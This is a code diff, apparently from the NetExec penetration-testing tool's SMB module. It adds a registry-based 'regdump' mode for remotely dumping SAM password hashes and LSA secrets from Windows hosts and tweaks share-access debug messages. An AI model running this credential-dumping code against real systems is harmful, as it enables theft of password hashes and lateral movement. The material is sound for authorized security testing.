@@ -13,6 +13,11 @@ from impacket.examples.secretsdump import (
     LSASecrets,
     NTDSHashes,
 )
+from impacket.examples.regsecrets import (
+    RemoteOperations as RegSecretsRemoteOperations,
+    SAMHashes as RegSecretsSAMHashes,
+    LSASecrets as RegSecretsLSASecrets
+)
 from impacket.nmb import NetBIOSError, NetBIOSTimeout
 from impacket.dcerpc.v5 import transport, lsat, lsad, scmr, rrp, srvs, wkst
 from impacket.dcerpc.v5.rpcrt import DCERPCException
@@ -1079,6 +1084,7 @@ class smb(connection):
                 try:
                     self.conn.createDirectory(share_name, temp_dir)
                     write_dir = True
+                    self.logger.debug(f"WRITE access with DIR creation on share: {share_name}")
                     try:
                         self.conn.deleteDirectory(share_name, temp_dir)
                     except SessionError as e:
@@ -1089,13 +1095,14 @@ class smb(connection):
                             self.logger.debug(f"Error DELETING created temp dir {temp_dir} on share {share_name}: {error}")
                 except SessionError as e:
                     error = get_error_string(e)
-                    self.logger.debug(f"Error checking WRITE access on share {share_name}: {error}")
+                    self.logger.debug(f"Error checking WRITE access with DIR creation on share {share_name}: {error}")
 
                 try:
                     tid = self.conn.connectTree(share_name)
                     fid = self.conn.createFile(tid, temp_file, desiredAccess=FILE_SHARE_WRITE, shareMode=FILE_SHARE_DELETE)
                     self.conn.closeFile(tid, fid)
                     write_file = True
+                    self.logger.debug(f"WRITE access with FILE creation on share: {share_name}")
                     try:
                         self.conn.deleteFile(share_name, temp_file)
                     except SessionError as e:
@@ -1106,7 +1113,7 @@ class smb(connection):
                             self.logger.debug(f"Error DELETING created temp file {temp_file} on share {share_name}")
                 except SessionError as e:
                     error = get_error_string(e)
-                    self.logger.debug(f"Error checking WRITE access with file on share {share_name}: {error}")
+                    self.logger.debug(f"Error checking WRITE access with FILE creation on share {share_name}: {error}")
 
                 # If we either can create a file or a directory we add the write privs to the output. Agreed on in https://github.com/Pennyw0rth/NetExec/pull/404
                 if write_dir or write_file:
@@ -1528,9 +1535,12 @@ class smb(connection):
         for src, dest in self.args.get_file:
             self.get_file_single(src, dest)
 
-    def enable_remoteops(self):
+    def enable_remoteops(self, regsecret=False):
         try:
-            self.remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
+            if regsecret:
+                self.remote_ops = RegSecretsRemoteOperations(self.conn, self.kerberos, self.kdcHost)
+            else:
+                self.remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
             self.remote_ops.enableRegistry()
             if self.bootkey is None:
                 self.bootkey = self.remote_ops.getBootKey()
@@ -1540,7 +1550,7 @@ class smb(connection):
     @requires_admin
     def sam(self):
         try:
-            self.enable_remoteops()
+            self.enable_remoteops(regsecret=(self.args.sam == "regdump"))
             host_id = self.db.get_hosts(filter_term=self.host)[0][0]
 
             def add_sam_hash(sam_hash, host_id):
@@ -1558,13 +1568,20 @@ class smb(connection):
             add_sam_hash.sam_hashes = 0
 
             if self.remote_ops and self.bootkey:
-                SAM_file_name = self.remote_ops.saveSAM()
-                SAM = SAMHashes(
-                    SAM_file_name,
-                    self.bootkey,
-                    isRemote=True,
-                    perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
-                )
+                if self.args.sam == "regdump":
+                    SAM = RegSecretsSAMHashes(
+                        self.bootkey,
+                        remoteOps=self.remote_ops,
+                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                    )
+                else:
+                    SAM_file_name = self.remote_ops.saveSAM()
+                    SAM = SAMHashes(
+                        SAM_file_name,
+                        self.bootkey,
+                        isRemote=True,
+                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                    )
 
                 self.logger.display("Dumping SAM hashes")
                 SAM.dump()
@@ -1575,7 +1592,9 @@ class smb(connection):
                     self.remote_ops.finish()
                 except Exception as e:
                     self.logger.debug(f"Error calling remote_ops.finish(): {e}")
-                SAM.finish()
+
+                if self.args.sam == "secdump":
+                    SAM.finish()
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping SAM. This is likely due to an endpoint protection.')
@@ -1792,7 +1811,7 @@ class smb(connection):
     @requires_admin
     def lsa(self):
         try:
-            self.enable_remoteops()
+            self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))
 
             def add_lsa_secret(secret):
                 add_lsa_secret.secrets += 1
@@ -1811,14 +1830,21 @@ class smb(connection):
             add_lsa_secret.secrets = 0
 
             if self.remote_ops and self.bootkey:
-                SECURITYFileName = self.remote_ops.saveSECURITY()
-                LSA = LSASecrets(
-                    SECURITYFileName,
-                    self.bootkey,
-                    self.remote_ops,
-                    isRemote=True,
-                    perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
-                )
+                if self.args.lsa == "regdump":
+                    LSA = RegSecretsLSASecrets(
+                        self.bootkey,
+                        self.remote_ops,
+                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                    )
+                else:
+                    SECURITYFileName = self.remote_ops.saveSECURITY()
+                    LSA = LSASecrets(
+                        SECURITYFileName,
+                        self.bootkey,
+                        self.remote_ops,
+                        isRemote=True,
+                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                    )
                 self.logger.success("Dumping LSA secrets")
                 LSA.dumpCachedHashes()
                 LSA.exportCached(self.output_filename)
@@ -1829,7 +1855,8 @@ class smb(connection):
                     self.remote_ops.finish()
                 except Exception as e:
                     self.logger.debug(f"Error calling remote_ops.finish(): {e}")
-                LSA.finish()
+                if self.args.lsa == "secdump":
+                    LSA.finish()
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping LSA. This is likely due to an endpoint protection.')
